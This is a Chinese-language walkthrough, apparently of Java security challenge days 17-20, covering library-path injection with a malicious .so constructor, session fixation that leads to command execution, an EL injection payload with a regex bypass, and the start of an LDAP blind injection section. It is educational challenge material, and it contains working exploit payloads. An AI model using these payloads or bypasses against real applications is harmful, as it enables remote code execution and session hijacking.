# Day17 Library注入
### 代码
Day 17  
### 漏洞点
从这段代码中可以看出，首先它有一个上传功能，它可以安全地上传任何扩展名以及任何Content-Type的文件至/var/myapp/data目录下。然后get请求中，会首先执行loadEnv()函数，它会将cookie进行处理，提取出cookie中的env段进行环境变量的设置，其中它在setEnv函数中对环境变量名进行判断，不允许环境变量名以"java",
"os"以及"file"开头。但可通过.java.xxx来绕过，从而可以设置以java开头的环境变量，将java.library.path设置为文件上传目录，从而在System.loadLibrary()函数中，加载恶意文件。
### 复现过程
#### 1\. 环境
  * IDEA+maven-archetype-webapp
#### 2\. 配置web.xml
      Archetype Created Web Application
        day17
        com.ananaskr.day17.JavaDeobfuscatorStartupController
        day17
        /day17
#### 3\. 补充文件上传代码
JavaDeobfuscatorStartupController.java
    public class JavaDeobfuscatorStartupController extends HttpServlet {
    ...
    private static void uploadFile(HttpServletRequest request, HttpServletResponse response) throws IOException {
            // Secure file upload with arbitrary content type and extension in known path /var/myapp/data
            DiskFileItemFactory factory = new DiskFileItemFactory();
            factory.setRepository(new File(System.getProperty("java.io.tmpdir")));
            ServletFileUpload upload = new ServletFileUpload(factory);
            String uploadPath = "/var/myapp/data";
            File uploadDir = new File(uploadPath);
            if(!uploadDir.exists()){
                uploadDir.mkdir();
            }
            try{
                List items = upload.parseRequest(request);
                if (items != null && items.size() >0){
                    for (FileItem item : items){
                        if(!item.isFormField()){
                            String name = item.getName();
                            String file = uploadPath+File.separator+name.replace("/","");
                            System.out.println(file);
                            File storeFile = new File(file);
                            item.write(storeFile);
                        }
                    }
                }
            } catch (Exception ex){
                response.sendRedirect("/");
            }
        }
        protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException{
            uploadFile(request,response);
        }
    ...
#### 4\. 补充上传的jsp
index.jsp
        Upload
#### 5\. payload构造
作为攻击者，目的主要是为了上传恶意的.so文件，使其在被加载时就执行恶意行为。在这里参考了[巧用LD_PRELOAD突破disable_functions](https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD)。GCC有个C语言扩展修饰符__attribute__((__constructor__))，可以让由它修饰的函数在main()之前执行，若它出现在共享对象中，那么共享对象被系统加载，立即执行__attribute__((__constructor__))修饰的函数。
可构造如下的libDEOBFUSCATION_LIB.c
    #define _GNU_SOURCE
    #include 
    #include 
    #include 
    __attribute__ ((__constructor__)) void preload (void){
        system("id");
    }
然后编译，生成恶意的so文件
    gcc -shared -fPIC libDEOBFUSCATION_LIB.c -o libDEOBFUSCATION_LIB.so -ldl
将生成的libDEOBFUSCATION_LIB.so首先上传到/var/myapp/data目录下。然后通过.java.library.path然后黑名单检查，因此可发送如下请求  
**提示** ：在此过程中，由于是在MAC
OS上进行的复现，System.loadLibrary("XXX")函数只会读取java.library.path路径下的libXXX.dylib，而不会读取libXXX.so。因此，将libDEOBFUSCATION_LIB.so修改后缀为libDEOBFUSCATION_LIB.dylib，然后进行上传，才可成功。
#### 6\. 结果
可看到，在命令行中输出了id的结果  
# Day18 会话固定攻击
### 代码
Day 18  
### 漏洞点
这段代码中有一个会话固定攻击，可导致命令注入漏洞。当第一次访问时，新的会话被创建且会话变量被设置，然而在此过程中，攻击者控制了一些会话的参数，用户输入的config被分割为key-value对。然后被处理的config值被合并至whitelist中。这将导致攻击者可以完全控制自己会话的会话变量。  
攻击者的目标是达到"execute last command"部分，只有通过Authorization
header提供有效密码并设置会话变量last_command时，才能访问"execute last command"部分。  
综上所述，攻击者可以完全控制会话变量，但仅仅在自己的会话中，没有密码，无法访问到"execute last
command"部分。在35-39行代码中存在会话固定漏洞，导致对受害者cookie的完全控制。可以通过向应用程序管理员发送一个链接，并通过参数config将其会话设置为已知会话，然后执行上次存储的shell命令。身份验证头是自动发送的，因此密码检查通过。
### 复现过程
#### 1\. 环境
  * IDEA+maven-archetype-webapp
#### 2\. 配置web.xml
      Archetype Created Web Application
        day18
        com.ananaskr.day18.LoadConfig
        day18
        /day18
#### 3\. 补充validBasicAuthHeader()
  1. import org.apache.tomcat.util.http.fileupload.IOUtils -> import org.apache.commons.io.IOUtils
  2. validBasicAuthHeader()
    private boolean validBasicAuthHeader(HttpServletRequest request){
            HttpSession session = request.getSession(true);
            String auth = (String)session.getAttribute("Authorization");
            if(auth.equals("password_of_day18")){
                return true;
            }else if(request.getParameter("passwd").equals("password_of_day18")){
                session.setAttribute("Authorization","password_of_day18");
                return true;
            }else{
                return false;
            }
        }
#### 4\. payload构造及复现
首先准备两个浏览器，Google和Safari分别对应于应用程序管理员和攻击者。
1.攻击者(在Safari浏览器中)首先访问应用程序，获得其session的JSESSIONID。并将last_command存储至session中。payload如下
    ?config=last_command@ls
2.将获取的JSESSIONID，即8A36A702791A470114ECD0BA77B61653。创建一个链接，发送给应用层序管理员，使其点击，将攻击的JSESSIONID与自己的会话绑定。
    ?config=JSESSIONID@D4E9132DB9703009B1C932E7C37286ED&save_session=yes
3.应用程序管理者(在Google浏览器中)发送如下payload，完成验证
    ?home=yes&passwd=password_of_day18
4.应用程序管理员点击`?config=JSESSIONID@D4E9132DB9703009B1C932E7C37286ED&save_session=yes`，将攻击者的JSESSIONID绑定至自己的会话中。
5.在这之后，攻击者再发送请求后，绕过了原来的验证，且一开始已经将last_command存储在会话中了，发送如下payload即可。
    ?home=yes
#### 5\. 结果
# Day19 EL注入
### 代码
Day 19  
### 漏洞点
代码获取请求参数p的值，并将其通过eval()函数执行，易导致表达式语言注入攻击。为了防止EL注入攻击，首先对获取的用户输入进行判断，必须以"开头，然后通过正则表达式防止注入危险的类和语言结构(这些类和语言结构可用于执行任意Java指令)。然而这些都很容易绕过。  
由于Java的灵活性，有无数方法绕过黑名单。例如，可以通过反射调用javax.scripts.ScriptEngineManager类。Eval需要一个字符串，很多方法可以对该字符串进行编码，最终导致代码注入。
### 复现过程
#### 1\. 环境
  * IDEA+maven-archetype-webapp
#### 2\. 配置web.xml
      Archetype Created Web Application
        day19
        com.ananaskr.day19.RenderExpression
        day19
        /day19
#### 3\. payload构造
由于直接执行java反射代码无法绕过对于"的判断，所以新实例化了一个ScriptEngine对象调用eval()函数实现代码注入。其中，对于正则表达式出现的关键字，采用replaceAll来绕过，具体的payload如下:
    "".equals(javax.script.ScriptEngineManager.class.getConstructor().newInstance().getEngineByExtension("js").eval("java.lang.Auntime.getAuntime().exec(\"touch /tmp/owned.jsp\")".replaceAll("A","R")))
在发送请求时，将其escape，其中"touch /tmp/owned.jsp"中间的空格换成"+"，否则会导致无法绕过正则匹配。
#### 4\. 结果
# Day20 LDAP盲注
### 代码
Day 20  
### 漏洞点
在代码的54行，用户输入username被传递给userExists()方法中，  
此方法检查此用户是否存在LDAP目录中。在此方法中对用户的输入首先进行一个过滤，不允许出现黑名单中的如uuid等敏感的值。然后将用户输入拼接到查询语句中进行用户的查询。若查询结果不为0，则页面出现"User
is
found"。根据这一差异，可以进行LDAP盲注。代码中通过对用户输入的值进行黑名单检查从而阻止LDAP注入，但是这仅仅限制了对敏感信息的种类的获取，不在黑名单中的信息createtimestamp，description的值依然可以获得。根据executeCommand()函数，且若获取到管理员用户的createtimestamp，可以生成API
token，然后利用此token可以执行shell命令。
### 复现过程
#### 1\. 环境